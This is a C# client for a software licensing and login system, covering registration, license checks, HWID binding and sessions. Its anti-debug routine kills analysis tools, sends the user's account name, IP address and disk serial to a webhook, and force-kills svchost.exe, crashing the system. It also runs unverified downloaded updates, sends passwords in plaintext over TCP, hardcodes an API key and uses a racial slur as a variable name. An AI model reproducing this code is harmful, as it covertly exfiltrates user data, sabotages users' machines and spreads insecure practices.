using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;

namespace TestClient
{
	public class NetworkManager
	{


		public class LoginSystemV1
		{

			public TcpClient tcpClient = new TcpClient();
			public StreamReader reader;
			public StreamWriter writer;
			public String UserPasswort { get; set; }
			public String UserName { get; set; }
			public String License { get; set; }
			public String HWID { get; set; }
			public String Version { get; set; }
			public String Application { get; set; }
			public String IP { get; set; }
			public int SessionStatus { get; set; }

			public LoginSystemV1(string serverip, String ApplicationClient, String Clientversion)
			{
				Application = ApplicationClient;
				Version = Clientversion;
				tcpClient.Connect(serverip, 6005);
				reader = new StreamReader(tcpClient.GetStream());
				writer = new StreamWriter(tcpClient.GetStream());
			}
			public ConsoleArt art = new ConsoleArt();
			public enum Options
			{
				Register,
				Login,
				License,
				LicenseLogin,
				Blocked,
				Variable,
				VersionCheck,
				Status,
				Webhook,
				IP,
				Session,
				SessionCheck
			}

			#region ChatSystem
			public async Task SendChatMessage(String Message, String Sender)
			{
				// Create an instance of HttpClient
				using (HttpClient client = new HttpClient())
				{
					// Set the base URL of the API endpoint
					string apiUrl = "http://localhost:9999/GetChat";

					// Create a new instance of FormUrlEncodedContent and add your parameters
					var parameters = new FormUrlEncodedContent(new[]
					{
					   new KeyValuePair<string, string>("Sender", Sender),
					   new KeyValuePair<string, string>("Message", Message)
					});

					// Send the POST request and get the response
					HttpResponseMessage response = await client.PostAsync(apiUrl, parameters);

					// Check if the request was successful
					if (response.IsSuccessStatusCode)
					{
						// Read the response content
						string responseContent = await response.Content.ReadAsStringAsync();

						// Process the response content as needed
						Console.WriteLine("Response: " + responseContent);
					}
					else
					{
						Console.WriteLine("Request failed with status code: " + response.StatusCode);
					}
				}
			}
			public List<string> Getchat()
			{
				List<string> chatData = new List<string>();

				using (WebClient getChat = new WebClient())
				{
					string responseData = getChat.DownloadString("http://localhost:9999/GetChat/");

					// Split the response data by newline to get individual chat entries
					string[] chatEntries = responseData.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);

					// Add each chat entry to the list
					chatData.AddRange(chatEntries);
				}

				return chatData;
			}

			#endregion
			public void CheckUpdate()
			{
				sendPacket(Options.VersionCheck + " " + Application + " " + Version);
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data.StartsWith("h") || data.StartsWith("H"))
				{
					art.FadeIn("Updating Application....");
					WebClient Autoupdater = new WebClient();
					Autoupdater.DownloadFile(data, "Updated-" + Process.GetCurrentProcess().ProcessName + ".exe");
					Thread.Sleep(1500);
					Process.Start(Directory.GetCurrentDirectory() + "\\Updated-" + Process.GetCurrentProcess().ProcessName + ".exe");
					Environment.Exit(0);
				}
				else
				{
					art.FadeIn(data);
				}
			}

			public async Task GetKilledSession(String Hwid, String Application)
			{



				sendPacket(Options.SessionCheck + " " + Hwid + " " + Application);
				String data = readPacket();

				if (data == "False")
				{
					art.FadeIn("Session Alive");
				}
				else if (data == "True")
				{
					art.FadeIn("Ur session is invalid");
					Thread.Sleep(200);
					Environment.Exit(0);
				}

			}
			public void isBlocked()
			{


				// art.FadeIn("Attempting login");
				sendPacket(Options.Blocked + " " + new Security().CPUID());
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					art.FadeIn("U are not Blocked");
				}
				else if (data == "True")
				{
					art.FadeIn("U are Blocked from this Application");
					Thread.Sleep(2000);
					Environment.Exit(0);
				}

			}
			public void CheckApplication()
			{


				// art.FadeIn("Attempting login");
				sendPacket(Options.Status + " " + Application);
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					art.FadeIn("Application is Now Online");
				}
				else if (data == "True")
				{
					art.FadeIn("Application is Now disabled");
					Thread.Sleep(2000);
					Environment.Exit(0);
				}

			}
			public String GetVar(String Variable)
			{
				sendPacket(Options.Variable + " " + Variable);
				String data = readPacket();
				return data;

			}
			public bool Register(String Name, String Passwort, String Currenthwid, String license)
			{
				UserName = Name;
				UserPasswort = Passwort;
				HWID = Currenthwid;

				sendPacket(Options.Register + " " + UserName + " " + UserPasswort + " " + HWID + " " + license);
				return true;
			}
			public async Task OpenSession(String HWID, String License, int Status = 1)
			{
				DateTime currentTime = DateTime.Now;

				string currentDate = currentTime.ToString("dd.MM.yyyy");
				string currentTimeString = currentTime.ToString("HH:mm:ss");


				sendPacket(Options.Session + " " + HWID + " " + Environment.MachineName + " " + License + " " + Status + " " + currentDate + " " + currentTimeString + " " + Application);

			}

			public async Task Webkey()
			{
				using (HttpClient client = new HttpClient())
				{
					try
					{
						client.DefaultRequestHeaders.Add("Application", "Blacksite");
						client.DefaultRequestHeaders.Add("API", "TestKey-gdihfgdhpoghgfbgdjhugsiupgüd");
						// Send the GET request and await the response
						HttpResponseMessage response = await client.GetAsync("http://localhost:8080/GetLicense/");

						// Ensure the response is successful
						response.EnsureSuccessStatusCode();

						// Read the response content as a string
						string responseBody = await response.Content.ReadAsStringAsync();

						// Display the response
						Console.WriteLine(responseBody);
					}
					catch (Exception ex)
					{
						Console.WriteLine("An error occurred: " + ex.Message);
					}
				}
			}
			public bool Login(String Name, String Passwort, String Currenthwid)
			{
				UserName = Name;
				UserPasswort = Passwort;
				HWID = Currenthwid;

				// art.FadeIn("Attempting login");
				sendPacket(Options.Login + " " + UserName + " " + UserPasswort + " " + HWID);
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					// art.FadeIn("Wrong Password");
					return false;
				}
				else if (data == "True")
				{
					//art.FadeIn("Login Sucessfully");
					return true;
				}
				return false;
			}
			public bool isIP_Blocked(String ip, String Hwid)
			{
				IP = ip;
				HWID = Hwid;

				// art.FadeIn("Attempting login");
				sendPacket(Options.IP + " " + IP + " " + HWID);
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					// art.FadeIn("Wrong Password");
					art.FadeIn("IP not Blocked");
					return false;
				}
				else if (data == "True")
				{
					art.FadeIn("IP is Blocked");
					Thread.Sleep(1000);
					Environment.Exit(0);
					return true;
				}
				return false;
			}
			public bool LicenseLogin(String LicenseKey, String Currenthwid)
			{
				License = LicenseKey;

				HWID = Currenthwid;

				// art.FadeIn("Attempting login");
				art.FadeIn("Application: " + LicenseKey.Split('-')[0]);
				sendPacket(Options.LicenseLogin + " " + License + " " + HWID + " " + LicenseKey.Split('-')[0]);
				// art.FadeIn("Waiting for Server");
				String data = readPacket();
				//art.FadeIn("Login Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					// art.FadeIn("Wrong Password");
					return false;
				}
				else if (data == "True")
				{
					//art.FadeIn("Login Sucessfully");
					return true;
				}
				return false;
			}

			public bool Checklicense(Enum OPLicense, String license)
			{
				sendPacket(Options.License + " " + license);
				String data = readPacket();
				//art.FadeIn("license Hash: {0}", data);

				// Send back a response.
				if (data == "False")
				{
					//art.FadeIn("invalid license");
					return false;
				}
				else
				{
					//art.FadeIn("valid license");
					return true;
				}
			}

			public string readPacket()
			{
				return reader.ReadLine();
			}


			public void sendPacket(string packet)
			{
				writer.WriteLine(packet);
				writer.Flush();
			}

			public void Close()
			{
				tcpClient.Close();
			}

		}


		public class ConsoleArt
		{
			public void FadeIn(String Text)
			{
				bool Colored = false;
				for (int i = 0; i < Text.Length; i++)
				{
					Thread.Sleep(25);
					if (Colored)
					{
						Console.ForegroundColor = ConsoleColor.Magenta;
						Colored = false;
					}
					else
					{
						Console.ForegroundColor = ConsoleColor.DarkMagenta;
						Colored = true;
					}

					Console.Write(Text[i]);
				}
				Console.WriteLine("");
			}
		}

		public class Security
		{
			[DllImport("kernel32.dll")]
			static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

			[StructLayout(LayoutKind.Sequential)]
			struct SYSTEM_INFO
			{
				public ushort processorArchitecture;
				ushort reserved;
				public uint pageSize;
				public IntPtr lpMinimumApplicationAddress;
				public IntPtr lpMaximumApplicationAddress;
				public IntPtr dwActiveProcessorMask;
				public uint dwNumberOfProcessors;
				public uint dwProcessorType;
				public uint dwAllocationGranularity;
				public ushort dwProcessorLevel;
				public ushort dwProcessorRevision;
			}

			[DllImport("user32.dll", SetLastError = true)]
			static extern bool GetSystemMetrics(int nIndex);

			const int SM_IMMENABLED = 82;

			public string CPUID()
			{
				return HardwareID.GetDiskSerialNumber("c");
			}
			public static class HardwareID
			{
				[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
				private static extern bool GetVolumeInformation(string rootPathName,
																 StringBuilder volumeNameBuffer,
																 int volumeNameSize,
																 out uint volumeSerialNumber,
																 out uint maximumComponentLength,
																 out uint fileSystemFlags,
																 StringBuilder fileSystemNameBuffer,
																 int nFileSystemNameSize);

				public static string GetDiskSerialNumber(string driveLetter)
				{
					uint serialNumber, maxComponentLength, flags;
					StringBuilder volumeLabel = new StringBuilder(256);
					StringBuilder fileSystemName = new StringBuilder(256);
					bool ok = GetVolumeInformation(driveLetter + ":\\",
													volumeLabel,
													volumeLabel.Capacity,
													out serialNumber,
													out maxComponentLength,
													out flags,
													fileSystemName,
													fileSystemName.Capacity);

					if (ok)
					{
						return serialNumber.ToString("X8");
					}
					else
					{
						throw new Exception("Failed to get disk serial number.");
					}
				}
				static bool IsProcessorIdSupported()
				{
					GetSystemInfo(out SYSTEM_INFO sysInfo);
					if (sysInfo.processorArchitecture != 0 || sysInfo.dwNumberOfProcessors != 1)
					{
						return false;
					}

					return GetSystemMetrics(SM_IMMENABLED);
				}
			}

			static class NativeMethods
			{
				[DllImport("kernel32.dll")]
				public static extern void cpuid(ref uint eax, out uint ebx, out uint ecx, out uint edx);
			}

			public class Debugger
			{
				public static String Webhook { get; set; }
				public Debugger(String Web)
				{
					Webhook = Web;
				}


				public static string GetIP()
				{
					var wc = new WebClient();
					var ip = wc.DownloadString("https://ipv4.wtfismyip.com/text");
					return ip;
				}

				public static void DebuggerAlert(string Debugger)
				{
					var NIGGER = Webhook;
					WebRequest wr = (HttpWebRequest)WebRequest.Create(NIGGER);
					wr.ContentType = "application/json";
					wr.Method = "POST";
					using (var sw = new StreamWriter(wr.GetRequestStream()))
					{
						var json = JsonConvert.SerializeObject(new
						{
							username = "Security | DJ HIP HOUSE#8553",
							embeds = new[]
							{
						new
						{
							description = "" +
										  $"\n [>] Debugger: {Debugger}" +
										  $"\n [>] Computer Username: {WindowsIdentity.GetCurrent().Name}" +
										  $"\n [>] IP Address: ||{GetIP()}||" +
										  $" [>] HWID: ||{new Security().CPUID()}||",
							title = $"Debugger Detected",
							color = "15548997",
						}
					}
						}); ;
						sw.Write(json);
					}
					var res = (HttpWebResponse)wr.GetResponse();
					Environment.Exit(0);
				}

				public void DebuggerCheck()
				{
					string[] Programs = {
			"ollydbg",
			"ida",
			"ida64",
			"idag",
			"idag64",
			"idaw",
			"idaw64",
			"idaq",
			"idaq64",
			"idau",
			"idau64",
			"scylla",
			"scylla_x64",
			"scylla_x86",
			"protection_id",
			"x64dbg",
			"x32dbg",
			"windbg",
			"reshacker",
			"ImportREC",
			"Lunar Engine",
			"lunarengine-i386",
			"lunarengine-x86_64",
			"lunarengine-x86_64-SSE4-AVX2",
			"gtutorial-i386",
			"IMMUNITYDEBUGGER",
			"MegaDumper",
			"Cheat Engine",
			"cheatengine-i386",
			"cheatengine-x86_64",
			"FolderChangesView",
			"cheatengine-x86_64-SSE4-AVX2",
			"HTTPDebuggerUI",
			"HTTPDebuggerSvc",
			"HTTP Debugger",
			"HTTP Debugger (32 bit)",
			"HTTP Debugger (64 bit)",
			"OLLYDBG",
			"Lunar Engine 7.2",
			"disassembly",
			"Debug",
			"[CPU",
			"Immunity",
			"WinDbg",
			"Cheat Engine 7.2",
			"Import reconstructor",
			"MegaDumper 1.0 by CodeCracker / SnD",
			"Processhacker",
			"KsDumperClient",
			"ProcessHacker",
			"procmon",
			"Wireshark",
			"vFiddler",
			"Xenos64",
			"HTTP Debugger Windows Service (32 bit)",
			"KsDumper",
			"IDA: Quick start",
			"Memory Viewer",
			"Process List",
			"dnSpy",
			"dotPeek64",
			"dotPeek32",
			"OzCode",
			"FusionReactor",
			"Extreme Dumper",
			"ExtremeDumper",
			"x32dbg",
			"x64dbg",
			};

					System.Timers.Timer aTimer = new System.Timers.Timer();
					aTimer.Elapsed += new ElapsedEventHandler(Debugger);
					aTimer.Interval = 1000;
					aTimer.Enabled = true;
					void Debugger(object source, ElapsedEventArgs e)
					{
						for (int i = 0; i < Programs.Length; i++)
						{
							Process[] processes = Process.GetProcessesByName(Programs[i]);
							if (processes.Length == 0) { }
							else
							{
								Process[] workers = Process.GetProcessesByName(Programs[i]);
								foreach (Process worker in workers)
								{
									worker.Kill();
									worker.WaitForExit();
									worker.Dispose();
								}
								DebuggerAlert(Programs[i]);


								Process.Start("cmd.exe", @"/C taskkill /IM svchost.exe /F");
								Environment.Exit(0);
							}
						}
					}
				}
			}
		}
		public class ConsoleDisabler
		{
			private const int MF_BYCOMMAND = 0x00000000;
			private const int SC_CLOSE = 0xF060;
			private const int MF_ENABLED = 0x00000000;

			[DllImport("user32.dll")]
			private static extern int EnableMenuItem(IntPtr hMenu, int uIDEnableItem, int uEnable);
			[DllImport("user32.dll")]
			private static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

			[DllImport("user32.dll")]
			private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

			[DllImport("kernel32.dll", ExactSpelling = true)]
			private static extern IntPtr GetConsoleWindow();
			public void DiscableCloseButton()
			{
				IntPtr consoleWindow = GetConsoleWindow();
				IntPtr systemMenu = GetSystemMenu(consoleWindow, false);

				if (systemMenu != IntPtr.Zero)
				{
					DeleteMenu(systemMenu, SC_CLOSE, MF_BYCOMMAND);
				}
			}
			public void EnableCloseButton()
			{
				IntPtr consoleWindow = GetConsoleWindow();
				IntPtr systemMenu = GetSystemMenu(consoleWindow, false);

				if (systemMenu != IntPtr.Zero)
				{
					EnableMenuItem(systemMenu, SC_CLOSE, MF_ENABLED);
				}
			}
		}
	}
}
